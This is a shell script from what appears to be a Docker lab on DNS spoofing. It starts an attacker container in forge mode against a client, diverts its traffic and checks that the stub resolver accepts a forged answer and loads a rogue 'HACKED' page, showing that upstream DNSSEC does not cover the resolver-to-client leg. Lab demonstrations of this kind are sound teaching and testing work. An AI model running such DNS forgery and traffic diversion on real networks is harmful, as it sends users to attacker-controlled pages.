#!/bin/sh
# 6.3 Client A (plain stub): forge the resolver -> client reply. The stub trusts
# it and lands on the rogue page. Upstream DNSSEC validated fine; it does not
# reach this far.
set -e
cd "$(dirname "$0")/.."
echo "== point the attacker at client-a and forge =="
VICTIM=172.16.1.10 MODE=forge docker compose up -d attacker >/dev/null 2>&1
sleep 2
sh scripts/divert.sh 172.16.1.10 >/dev/null
sh scripts/flush.sh >/dev/null
printf "client-a example.com (expect 172.16.1.30 ROGUE) -> "
docker exec client-a dig +short +time=5 +tries=1 example.com
printf "client-a www.example.com (untargeted, expect 172.16.1.20) -> "
docker exec client-a dig +short +time=5 +tries=1 www.example.com
echo "-- fetch (expect rogue HACKED page) --"
docker exec client-a curl -s http://example.com | grep -iE 'hacked|rogue' || true
sh scripts/undivert.sh 172.16.1.10 >/dev/null
